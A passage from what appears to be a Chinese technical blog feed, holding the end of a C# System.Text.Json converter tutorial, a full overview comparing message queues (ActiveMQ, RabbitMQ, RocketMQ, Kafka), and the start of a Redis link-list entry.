JsonSerializer.Deserialize&lt;UserInfo&gt;(json, options);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JSON 输出</span></span><br><span class="line">&#123;<span class="string">"Name"</span>:<span class="string">"Ron"</span>,<span class="string">"Age"</span>:<span class="number">30</span>,<span class="string">"LoginTime"</span>:<span class="number">1577655080422</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="应用-JsonConverter-特性方式"><a href="#应用-JsonConverter-特性方式" class="headerlink" title="应用 JsonConverter 特性方式"></a>应用 JsonConverter 特性方式</h4><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    [<span class="meta">JsonConverter(typeof(JsonConverterUnixDateTime))</span>]</span><br><span class="line">    <span class="keyword">public</span> DateTime LoginTime &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo() &#123; Age = <span class="number">30</span>, Name = <span class="string">"Ron"</span>, LoginTime = DateTime.Now &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user);</span><br><span class="line"><span class="keyword">var</span> deUser = JsonSerializer.Deserialize&lt;UserInfo&gt;(json);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JSON 输出</span></span><br><span class="line">&#123;<span class="string">"Name"</span>:<span class="string">"Ron"</span>,<span class="string">"Age"</span>:<span class="number">30</span>,<span class="string">"LoginTime"</span>:<span class="number">1577655080422</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;注意上面的 UserInfo.LoginTime 的特性标记，当你想小范围的对某些属性单独应用转换器的时候，这种方式费用小巧而有效。</p>
<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>&emsp;&emsp;本文全面的介绍了 System.Text.Json 在各种场景下的用法，并比较和 Newtonsoft.Json 使用上的不同，也通过实例演示了具体的使用方法，进一步深入讲解了 System.Text.Json 各种对象的原理，希望对大家在迁移到.NETCore-3.1 的时候有所帮助。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈消息队列及常见的消息中间件]]></title>
      <url>/2019/12/30/WhatIsMessageQueuing/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://juejin.im/post/5b41fe36e51d45191252e79e" target="_blank" rel="noopener">https://juejin.im/post/5b41fe36e51d45191252e79e</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;消息队列 已经逐渐成为企业应用系统 内部通信 的核心手段。它具有 低耦合、可靠投递、广播、流量控制、最终一致性 等一系列功能。<br>&emsp;&emsp;当前使用较多的 消息队列 有 RabbitMQ、RocketMQ、ActiveMQ、Kafka、ZeroMQ、MetaMQ 等，而部分 数据库 如 Redis、MySQL 以及 phxsql 也可实现消息队列的功能。</p>
<figure class="image-box">
                <img src="16479c8ed095ffed.webp" alt title class>
                <p></p>
            </figure>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="消息队列概述"><a href="#消息队列概述" class="headerlink" title="消息队列概述"></a>消息队列概述</h2><p>&emsp;&emsp;消息队列 是指利用 高效可靠 的 消息传递机制 进行与平台无关的 数据交流，并基于 数据通信 来进行分布式系统的集成。</p>
<figure class="image-box">
                <img src="16479c8e7c77109d.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;通过提供 消息传递 和 消息排队 模型，它可以在 分布式环境 下提供 应用解耦、弹性伸缩、冗余存储、流量削峰、异步通信、数据同步 等等功能，其作为 分布式系统架构 中的一个重要组件，有着举足轻重的地位。</p>
<h2 id="消息队列的特点"><a href="#消息队列的特点" class="headerlink" title="消息队列的特点"></a>消息队列的特点</h2><h3 id="采用异步处理模式"><a href="#采用异步处理模式" class="headerlink" title="采用异步处理模式"></a>采用异步处理模式</h3><p>&emsp;&emsp;消息发送者 可以发送一个消息而无须等待响应。消息发送者 将消息发送到一条 虚拟的通道（主题 或 队列）上，消息接收者 则 订阅 或是 监听 该通道。一条信息可能最终转发给 一个或多个 消息接收者，这些接收者都无需对 消息发送者 做出 同步回应。整个过程都是 异步的。</p>
<h3 id="应用系统之间解耦合"><a href="#应用系统之间解耦合" class="headerlink" title="应用系统之间解耦合"></a>应用系统之间解耦合</h3><p>主要体现在如下两点：</p>
<ol>
<li>发送者和接受者不必了解对方、只需要 确认消息；</li>
<li>发送者和接受者 不必同时在线。</li>
</ol>
<p>&emsp;&emsp;比如在线交易系统为了保证数据的 最终一致，在 支付系统 处理完成后会把 支付结果 放到 消息中间件 里，通知 订单系统 修改 订单支付状态。两个系统是通过消息中间件解耦的。</p>
<h2 id="消息队列的传递服务模型"><a href="#消息队列的传递服务模型" class="headerlink" title="消息队列的传递服务模型"></a>消息队列的传递服务模型</h2><p>&emsp;&emsp;消息队列的 传递服务模型 如下图所示：</p>
<figure class="image-box">
                <img src="16479c8e7c831340.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="消息队列的的传输模式"><a href="#消息队列的的传输模式" class="headerlink" title="消息队列的的传输模式"></a>消息队列的的传输模式</h2><h3 id="点对点模型"><a href="#点对点模型" class="headerlink" title="点对点模型"></a>点对点模型</h3><p>&emsp;&emsp;点对点模型 用于 消息生产者 和 消息消费者 之间 点到点 的通信。消息生产者将消息发送到由某个名字标识的特定消费者。这个名字实际上对于消费服务中的一个 队列（Queue），在消息传递给消费者之前它被 存储 在这个队列中。队列消息 可以放在 内存 中也可以 持久化，以保证在消息服务出现故障时仍然能够传递消息。<br>&emsp;&emsp;传统的点对点消息中间件通常由 消息队列服务、消息传递服务、消息队列 和 消息应用程序接口 API 组成，其典型的结构如下图所示。</p>
<figure class="image-box">
                <img src="16479c8e7c97b0c3.jpg" alt title class>
                <p></p>
            </figure>

<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol>
<li>每个消息只用一个消费者；</li>
<li>发送者和接受者没有时间依赖；</li>
<li>接受者确认消息接受和处理成功。</li>
</ol>
<p>示意图如下所示：</p>
<figure class="image-box">
                <img src="16479c8e7c89962f.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="发布-订阅模型（Pub-Sub）"><a href="#发布-订阅模型（Pub-Sub）" class="headerlink" title="发布/订阅模型（Pub/Sub）"></a>发布/订阅模型（Pub/Sub）</h3><p>&emsp;&emsp;发布者/订阅者 模型支持向一个特定的 消息主题 生产消息。0 或 多个订阅者 可能对接收来自 特定消息主题 的消息感兴趣。<br>&emsp;&emsp;在这种模型下，发布者和订阅者彼此不知道对方，就好比是匿名公告板。这种模式被概况为：多个消费者可以获得消息，在 发布者 和 订阅者 之间存在 时间依赖性。发布者需要建立一个 订阅（subscription），以便能够消费者订阅。订阅者 必须保持 持续的活动状态 并 接收消息。<br>&emsp;&emsp;在这种情况下，在订阅者 未连接时，发布的消息将在订阅者 重新连接 时 重新发布，如下图所示：</p>
<figure class="image-box">
                <img src="16479c8e7faf60a5.jpg" alt title class>
                <p></p>
            </figure>

<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ol>
<li>每个消息可以有多个订阅者；</li>
<li>客户端只有订阅后才能接收到消息；</li>
<li>持久订阅和非持久订阅。</li>
</ol>
<blockquote>
<p>注意：</p>
<ol>
<li>发布者和订阅者有时间依赖：接受者和发布者只有建立订阅关系才能收到消息；</li>
<li>持久订阅：订阅关系建立后，消息就不会消失，不管订阅者是否都在线；</li>
<li>非持久订阅：订阅者为了接受消息，必须一直在线。 当只有一个订阅者时约等于点对点模式</li>
</ol>
</blockquote>
<h2 id="消息队列应用场景"><a href="#消息队列应用场景" class="headerlink" title="消息队列应用场景"></a>消息队列应用场景</h2><p>&emsp;&emsp;当你需要使用 消息队列 时，首先需要考虑它的必要性。可以使用消息队列的场景有很多，最常用的几种，是做 应用程序松耦合、异步处理模式、发布与订阅、最终一致性、错峰流控 和 日志缓冲 等。反之，如果需要 强一致性，关注业务逻辑的处理结果，则使用 RPC 显得更为合适。</p>
<h3 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h3><p>&emsp;&emsp;非核心 流程 异步化，减少系统 响应时间，提高 吞吐量。例如：短信通知、终端状态推送、App 推送、用户注册 等。<br>&emsp;&emsp;消息队列 一般都内置了 高效的通信机制，因此也可以用于单纯的消息通讯，比如实现 点对点消息队列 或者 聊天室 等。</p>
<h4 id="应用案例"><a href="#应用案例" class="headerlink" title="应用案例"></a>应用案例</h4><p>&emsp;&emsp;网站用户注册，注册成功后会过一会发送邮件确认或者短息。</p>
<figure class="image-box">
                <img src="16479c8e800ce905.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="系统解耦"><a href="#系统解耦" class="headerlink" title="系统解耦"></a>系统解耦</h3><ul>
<li>系统之间不是 强耦合的，消息接受者 可以随意增加，而不需要修改 消息发送者的代码。消息发送者 的成功不依赖 消息接受者（比如：有些银行接口不稳定，但调用方并不需要依赖这些接口）。</li>
<li>不强依赖 于非本系统的核心流程，对于 非核心流程，可以放到消息队列中让 消息消费者 去按需消费，而 不影响核心主流程。</li>
</ul>
<h3 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h3><p>&emsp;&emsp;最终一致性 不是 消息队列 的必备特性，但确实可以依靠 消息队列 来做 最终一致性 的事情。</p>
<ul>
<li>先写消息再操作，确保操作完成后再修改消息状态。定时任务补偿机制 实现消息 可靠发送接收、业务操作的可靠执行，要注意 消息重复 与 幂等设计。</li>
<li>所有不保证 100% 不丢消息 的消息队列，理论上无法实现 最终一致性。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;像 Kafka 一类的设计，在设计层面上就有 丢消息 的可能（比如 定时刷盘，如果掉电就会丢消息）。哪怕只丢千分之一的消息，业务也必须用其他的手段来保证结果正确。</p>
</blockquote>
<h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>&emsp;&emsp;生产者/消费者 模式，只需要关心消息是否 送达队列，至于谁希望订阅和需要消费，是 下游 的事情，无疑极大地减少了开发和联调的工作量。</p>
<figure class="image-box">
                <img src="16479c8ea267f536.webp" alt title class>
                <p></p>
            </figure>

<h3 id="流量削峰和流控"><a href="#流量削峰和流控" class="headerlink" title="流量削峰和流控"></a>流量削峰和流控</h3><p>&emsp;&emsp;当 上下游系统 处理能力存在差距的时候，利用 消息队列 做一个通用的 “漏斗”，进行 限流控制。在下游有能力处理的时候，再进行分发。</p>
<blockquote>
<p>&emsp;&emsp;举个例子：用户在支付系统成功结账后，订单系统会通过短信系统向用户推送扣费通知。短信系统 可能由于 短板效应，速度卡在 网关 上（每秒几百次请求），跟 前端的并发量 不是一个数量级。于是，就造成 支付系统 和 短信系统 的处理能力出现差异化。</p>
</blockquote>
<p>&emsp;&emsp;然而用户晚上个半分钟左右收到短信，一般是不会有太大问题的。如果没有消息队列，两个系统之间通过 协商、滑动窗口 等复杂的方案也不是说不能实现。但 系统复杂性 指数级增长，势必在 上游 或者 下游 做 存储，并且要处理 定时、拥塞 等一系列问题。而且每当有 处理能力有差距 的时候，都需要 单独 开发一套逻辑来维护这套逻辑。<br>&emsp;&emsp;所以，利用中间系统转储两个系统的通信内容，并在下游系统有能力处理这些消息的时候，再处理这些消息，是一套相对较通用的方式。</p>
<h4 id="应用案例-1"><a href="#应用案例-1" class="headerlink" title="应用案例"></a>应用案例</h4><ol>
<li>把消息队列当成可靠的 消息暂存地，进行一定程度的 消息堆积；</li>
<li>定时进行消息投递，比如模拟 用户秒杀 访问，进行 系统性能压测。</li>
</ol>
<figure class="image-box">
                <img src="16479c8ea3e6231a.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="日志处理"><a href="#日志处理" class="headerlink" title="日志处理"></a>日志处理</h3><p>&emsp;&emsp;将消息队列用在 日志处理 中，比如 Kafka 的应用，解决 海量日志 传输和缓冲的问题。</p>
<h4 id="应用案例-2"><a href="#应用案例-2" class="headerlink" title="应用案例"></a>应用案例</h4><p>&emsp;&emsp;把日志进行集中收集，用于计算 PV、用户行为分析 等等。</p>
<figure class="image-box">
                <img src="16479c8ea41e864b.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="消息通讯"><a href="#消息通讯" class="headerlink" title="消息通讯"></a>消息通讯</h3><p>&emsp;&emsp;消息队列一般都内置了 高效的通信机制，因此也可以用于单纯的 消息通讯，比如实现 点对点消息队列 或者 聊天室 等。</p>
<h2 id="消息队列的推拉模型"><a href="#消息队列的推拉模型" class="headerlink" title="消息队列的推拉模型"></a>消息队列的推拉模型</h2><h3 id="Push-推消息模型"><a href="#Push-推消息模型" class="headerlink" title="Push 推消息模型"></a>Push 推消息模型</h3><p>&emsp;&emsp;消息生产者 将消息发送给 消息队列，消息队列 又将消息推给 消息消费者。</p>
<h3 id="Pull-拉消息模型"><a href="#Pull-拉消息模型" class="headerlink" title="Pull 拉消息模型"></a>Pull 拉消息模型</h3><p>&emsp;&emsp;消费者 请求 消息队列 接受消息，消息生产者 从 消息队列 中拉该消息。</p>
<h3 id="两种类型的区别"><a href="#两种类型的区别" class="headerlink" title="两种类型的区别"></a>两种类型的区别</h3><figure class="image-box">
                <img src="16479c8ea4b19ea9.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="消息队列技术对比"><a href="#消息队列技术对比" class="headerlink" title="消息队列技术对比"></a>消息队列技术对比</h2><p>&emsp;&emsp;本部分主要介绍四种常用的消息队列（ActiveMQ / RabbitMQ / RocketMQ / Kafka）的主要特性、优点、缺点。</p>
<h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p>&emsp;&emsp;ActiveMQ 是由 Apache 出品，ActiveMQ 是一个完全支持JMS1.1 和 J2EE 1.4 规范的 JMS Provider 实现。它非常快速，支持 多种语言的客户端 和 协议，而且可以非常容易的嵌入到企业的应用环境中，并有许多高级功能。</p>
<figure class="image-box">
                <img src="16479c8ea7cdc2c0.png" alt title class>
                <p></p>
            </figure>

<h4 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h4><ol>
<li>服从JMS规范：JMS 规范提供了良好的标准和保证，包括：同步 或 异步 的消息分发，一次和仅一次的消息分发，消息接收 和 订阅 等等。遵从 JMS 规范的好处在于，不论使用什么 JMS 实现提供者，这些基础特性都是可用的；</li>
<li>连接灵活性：ActiveMQ 提供了广泛的 连接协议，支持的协议有：HTTP/S，IP 多播，SSL，TCP，UDP 等等。对众多协议的支持让 ActiveMQ 拥有了很好的灵活性；</li>
<li>支持的协议种类多：OpenWire、STOMP、REST、XMPP、AMQP；</li>
<li>持久化插件和安全插件：ActiveMQ 提供了 多种持久化 选择。而且，ActiveMQ 的安全性也可以完全依据用户需求进行 自定义鉴权 和 授权；</li>
<li>支持的客户端语言种类多：除了 Java 之外，还有：C/C++，.NET，Perl，PHP，Python，Ruby；</li>
<li>代理集群：多个 ActiveMQ 代理 可以组成一个 集群 来提供服务；</li>
<li>异常简单的管理：ActiveMQ 是以开发者思维被设计的。所以，它并不需要专门的管理员，因为它提供了简单又使用的管理特性。有很多中方法可以 监控 ActiveMQ 不同层面的数据，包括使用在 JConsole 或者在 ActiveMQ 的 Web Console 中使用 JMX。通过处理 JMX 的告警消息，通过使用 命令行脚本，甚至可以通过监控各种类型的 日志。</li>
</ol>
<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><p>&emsp;&emsp;ActiveMQ 可以运行在 Java 语言所支持的平台之上。使用 ActiveMQ 需要：</p>
<ul>
<li>Java JDK</li>
<li>ActiveMQ 安装包</li>
</ul>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol>
<li>跨平台 (JAVA 编写与平台无关，ActiveMQ 几乎可以运行在任何的 JVM 上)；</li>
<li>可以用 JDBC：可以将 数据持久化 到数据库。虽然使用 JDBC 会降低 ActiveMQ 的性能，但是数据库一直都是开发人员最熟悉的存储介质；</li>
<li>支持 JMS 规范：支持 JMS 规范提供的 统一接口;</li>
<li>支持 自动重连 和 错误重试机制；</li>
<li>有安全机制：支持基于 shiro，jaas 等多种 安全配置机制，可以对 Queue/Topic 进行 认证和授权；</li>
<li>监控完善：拥有完善的 监控，包括 Web Console，JMX，Shell 命令行，Jolokia 的 RESTful API；</li>
<li>界面友善：提供的 Web Console 可以满足大部分情况，还有很多 第三方的组件 可以使用，比如 hawtio；</li>
</ol>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ol>
<li>社区活跃度不及 RabbitMQ 高；</li>
<li>根据其他用户反馈，会出莫名其妙的问题，会 丢失消息；</li>
<li>目前重心放到 activemq 6.0 产品 Apollo，对 5.x 的维护较少；</li>
<li>不适合用于 上千个队列 的应用场景；</li>
</ol>
<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><p>&emsp;&emsp;RabbitMQ 于 2007 年发布，是一个在 AMQP (高级消息队列协议)基础上完成的，可复用的企业消息系统，是当前最主流的消息中间件之一。</p>
<figure class="image-box">
                <img src="16479c8ece3b5d7a.png" alt title class>
                <p></p>
            </figure>

<h4 id="主要特性-1"><a href="#主要特性-1" class="headerlink" title="主要特性"></a>主要特性</h4><ol>
<li>可靠性：提供了多种技术可以让你在 性能 和 可靠性 之间进行 权衡。这些技术包括 持久性机制、投递确认、发布者证实 和 高可用性机制；</li>
<li>灵活的路由：消息在到达队列前是通过 交换机 进行 路由 的。RabbitMQ 为典型的路由逻辑提供了 多种内置交换机 类型。如果你有更复杂的路由需求，可以将这些交换机组合起来使用，你甚至可以实现自己的交换机类型，并且当做 RabbitMQ 的 插件 来使用；</li>
<li>消息集群：在相同局域网中的多个 RabbitMQ 服务器可以 聚合 在一起，作为一个独立的逻辑代理来使用；</li>
<li>队列高可用：队列可以在集群中的机器上 进行镜像，以确保在硬件问题下还保证 消息安全；</li>
<li>支持多种协议：支持 多种消息队列协议；</li>
<li>支持多种语言：用 Erlang 语言编写，支持只要是你能想到的 所有编程语言；</li>
<li>管理界面： RabbitMQ 有一个易用的 用户界面，使得用户可以 监控 和 管理 消息 Broker 的许多方面；</li>
<li>跟踪机制：如果 消息异常，RabbitMQ 提供消息跟踪机制，使用者可以找出发生了什么；</li>
<li>插件机制：提供了许多 插件，来从多方面进行扩展，也可以编写自己的插件。</li>
</ol>
<h4 id="部署环境-1"><a href="#部署环境-1" class="headerlink" title="部署环境"></a>部署环境</h4><p>&emsp;&emsp;RabbitMQ 可以运行在 Erlang 语言所支持的平台之上，包括 Solaris，BSD，Linux，MacOSX，TRU64，Windows 等。使用 RabbitMQ 需要：</p>
<ul>
<li>ErLang 语言包</li>
<li>RabbitMQ 安装包</li>
</ul>
<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol>
<li>由于 Erlang 语言的特性，消息队列性能较好，支持 高并发；</li>
<li>健壮、稳定、易用、跨平台、支持 多种语言、文档齐全；</li>
<li>有消息 确认机制 和 持久化机制，可靠性高；</li>
<li>高度可定制的 路由；</li>
<li>管理界面 较丰富，在互联网公司也有较大规模的应用，社区活跃度高。</li>
</ol>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ol>
<li>尽管结合 Erlang 语言本身的并发优势，性能较好，但是不利于做 二次开发和维护；</li>
<li>实现了 代理架构，意味着消息在发送到客户端之前可以在 中央节点 上排队。此特性使得 RabbitMQ 易于使用和部署，但是使得其 运行速度较慢，因为中央节点 增加了延迟，消息封装后 也比较大；</li>
<li>需要学习 比较复杂 的 接口和协议，学习和维护成本较高。</li>
</ol>
<h3 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h3><p>&emsp;&emsp;RocketMQ 出自 阿里 的开源产品，用 Java 语言实现，在设计时参考了 Kafka，并做出了自己的一些改进，消息可靠性上 比 Kafka 更好。RocketMQ 在阿里内部被广泛应用在 订单，交易，充值，流计算，消息推送，日志流式处理，binglog 分发 等场景。</p>
<figure class="image-box">
                <img src="16479c8ec333c809.png" alt title class>
                <p></p>
            </figure>

<h4 id="主要特性-2"><a href="#主要特性-2" class="headerlink" title="主要特性"></a>主要特性</h4><ol>
<li>基于 队列模型：具有 高性能、高可靠、高实时、分布式 等特点；</li>
<li>Producer、Consumer、队列 都支持 分布式；</li>
<li>Producer 向一些队列轮流发送消息，队列集合 称为 Topic。Consumer 如果做 广播消费，则一个 Consumer 实例消费这个 Topic 对应的 所有队列；如果做 集群消费，则 多个 Consumer 实例 平均消费 这个 Topic 对应的队列集合；</li>
<li>能够保证 严格的消息顺序；</li>
<li>提供丰富的 消息拉取模式；</li>
<li>高效的订阅者 水平扩展能力；</li>
<li>实时 的 消息订阅机制；</li>
<li>亿级 消息堆积 能力；</li>
<li>较少的外部依赖。</li>
</ol>
<h4 id="部署环境-2"><a href="#部署环境-2" class="headerlink" title="部署环境"></a>部署环境</h4><p>&emsp;&emsp;RocketMQ 可以运行在 Java 语言所支持的平台之上。使用 RocketMQ 需要：</p>
<ul>
<li>Java JDK</li>
<li>安装 git、Maven</li>
<li>RocketMQ 安装包</li>
</ul>
<h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ol>
<li>单机 支持 1 万以上 持久化队列；</li>
<li>RocketMQ 的所有消息都是 持久化的，先写入系统  PAGECACHE，然后 刷盘，可以保证 内存 与 磁盘 都有一份数据，而 访问 时，直接 从内存读取。</li>
<li>模型简单，接口易用（JMS 的接口很多场合并不太实用）；</li>
<li>性能非常好，可以允许 大量堆积消息 在 Broker 中；</li>
<li>支持 多种消费模式，包括 集群消费、广播消费等；</li>
<li>各个环节 分布式扩展设计，支持 主从 和 高可用；</li>
<li>开发度较活跃，版本更新很快。</li>
</ol>
<h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ol>
<li>支持的 客户端语言 不多，目前是 Java 及 C++，其中 C++ 还不成熟；</li>
<li>RocketMQ 社区关注度及成熟度也不及前两者；</li>
<li>没有 Web 管理界面，提供了一个 CLI (命令行界面) 管理工具带来 查询、管理 和 诊断各种问题；</li>
<li>没有在 MQ 核心里实现 JMS 等接口；</li>
</ol>
<h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>&emsp;&emsp;Apache Kafka 是一个 分布式消息发布订阅 系统。它最初由 LinkedIn 公司基于独特的设计实现为一个 分布式的日志提交系统 (a distributed commit log)，之后成为 Apache 项目的一部分。Kafka 性能高效、可扩展良好 并且 可持久化。它的 分区特性，可复制 和 可容错 都是其不错的特性。</p>
<figure class="image-box">
                <img src="16479c8ec4ba760a.png" alt title class>
                <p></p>
            </figure>

<h4 id="主要特性-3"><a href="#主要特性-3" class="headerlink" title="主要特性"></a>主要特性</h4><ol>
<li>快速持久化：可以在 O(1) 的系统开销下进行 消息持久化；</li>
<li>高吞吐：在一台普通的服务器上既可以达到 10W/s 的 吞吐速率；</li>
<li>完全的分布式系统：Broker、Producer 和 Consumer 都原生自动支持 分布式，自动实现 负载均衡；</li>
<li>支持 同步 和 异步 复制两种 高可用机制；</li>
<li>支持 数据批量发送 和 拉取；</li>
<li>零拷贝技术（zero-copy）：减少 IO 操作步骤，提高 系统吞吐量；</li>
<li>数据迁移、扩容 对用户透明；</li>
<li>无需停机 即可扩展机器；</li>
<li>其他特性：丰富的 消息拉取模型、高效 订阅者水平扩展、实时的 消息订阅、亿级的 消息堆积能力、定期删除机制；</li>
</ol>
<h4 id="部署环境-3"><a href="#部署环境-3" class="headerlink" title="部署环境"></a>部署环境</h4><p>&emsp;&emsp;使用 Kafka 需要：</p>
<ul>
<li>Java JDK</li>
<li>Kafka 安装包</li>
</ul>
<h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><ol>
<li>客户端语言丰富：支持 Java、.Net、PHP、Ruby、Python、Go 等多种语言；</li>
<li>高性能：单机写入 TPS 约在 100 万条/秒，消息大小 10 个字节；</li>
<li>提供 完全分布式架构，并有 replica 机制，拥有较高的 可用性 和 可靠性，理论上支持 消息无限堆积；</li>
<li>支持批量操作；</li>
<li>消费者 采用 Pull 方式获取消息。消息有序，通过控制 能够保证所有消息被消费且仅被消费 一次；</li>
<li>有优秀的第三方 Kafka Web 管理界面 Kafka-Manager；</li>
<li>在 日志领域 比较成熟，被多家公司和多个开源项目使用。</li>
</ol>
<h4 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h4><ol>
<li>Kafka 单机超过 64 个 队列/分区 时，Load 时会发生明显的飙高现象。队列 越多，负载 越高，发送消息 响应时间变长；</li>
<li>使用 短轮询方式，实时性 取决于 轮询间隔时间；</li>
<li>消费失败 不支持重试；</li>
<li>支持 消息顺序，但是 一台代理宕机 后，就会产生 消息乱序；</li>
<li>社区更新较慢。</li>
</ol>
<h3 id="几种消息队列对比"><a href="#几种消息队列对比" class="headerlink" title="几种消息队列对比"></a>几种消息队列对比</h3><p>&emsp;&emsp;这里列举了上述四种消息队列的差异对比：</p>
<figure class="image-box">
                <img src="16479c8ecf7ad3ef.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Kafka 在于 分布式架构，RabbitMQ 基于 AMQP 协议 来实现，RocketMQ 的思路来源于 Kafka，改成了 主从结构，在 事务性 和 可靠性 方面做了优化。广泛来说，电商、金融 等对 事务一致性 要求很高的，可以考虑 RabbitMQ 和 RocketMQ，对 性能要求高 的可考虑 Kafka。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>&emsp;&emsp;本文介绍了消息队列的特点，消息队列的 传递服务模型，消息的 传输方式，消息的 推拉模式。然后介绍了 ActiveMQ，RabbitMQ，RocketMQ 和 Kafka 几种常见的消息队列，阐述了 各种消息队列 的 主要特点 和 优缺点。通过本文，对于消息队列及相关技术选型，相信你会有了更深入的理解和认识。更多细节和原理性的东西，还需在实践中见真知！</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RabbitMQ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入剖析 Redis]]></title>
      <url>/2019/12/30/LearningRedis/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Windows 环境搭建：<a href="https://www.cnblogs.com/igeekfan/p/12115033.html" target="_blank" rel="noopener">https://www.cnblogs.com/igeekfan/p/12115033.html</a><br>CSRedis 使用：<a href="https://www.cnblogs.com/igeekfan/p/12115048.html" target="_blank" rel="noopener">https://www.cnblogs.com/igeekfan/p/12115048.html</a>  </p>
</blockquote>
<blockquote>
<p>入门简介与主从搭建：<a href="https://juejin.im/post/5b76e732f265da4376203849" target="_blank" rel="noopener">https://juejin.im/post/5b76e732f265da4376203849</a><br>哨兵模式与高可用集群：<a href="https://juejin.im/post/5b7d226a6fb9a01a1e01ff64" target="_blank" rel="noopener">https://juejin.im/post/5b7d226a6fb9a01a1e01ff64</a><br>集群模式搭建与原理详解：<a href="https://juejin.im/post/5b8fc5536fb9a05d2d01fb11" target="_blank" rel="noopener">https://juejin.im/post/5b8fc5536fb9a05d2d01fb11</a><br>数据结构与全局命令概述：<a href="https://juejin.im/post/5bb01064e51d453eb93d8028" target="_blank" rel="noopener">https://juejin.im/post/5bb01064e51d453eb93d8028</a><br>数据结构之字符串：<a href="https://juejin.im/post/5bbc9d03f265da0ab915e3b5" target="_blank" rel="noopener">https://juejin.im/post/5bbc9d03f265da0ab915e3b5</a><br>数据结构之哈希：<a href="https://juejin.im/post/5bc359ff5188255c7b16ab72" target="_blank" rel="noopener">https://juejin.im/post/5bc359ff5188255c7b16ab72</a><br>数据结构之列表：<a href="https://juejin.im/post/5bcb3b066fb9a05d1c14c712" target="_blank" rel="noopener">https://juejin.im/post/5bcb3b066fb9a05d1c14c712</a><br>数据结构之集合：<a href="https://juejin.im/post/5be455d75188250e8601b3e0" target="_blank" rel="noopener">https://juejin.im/post/5be455d75188250e8601b3e0</a>  </p>
</blockquote>
<blockquote>
<p>磁盘持久化机制：<a href="https://juejin.im/post/5da14c37e51d45784603adb7" target="_blank" rel="noopener">https://juejin.im/post/5da14c37e51d45784603adb7</a><br>内存回收机制：<a href="https://juejin.im/post/5d107ad851882576df7fba9e" target="_blank" rel="noopener">https://juejin.im/post/5d107ad851882576df7fba9e</a>  </p>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="16560ce61de7471a.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>参考：<em>《Redis 开发与运维》</em></p>
</blockquote>
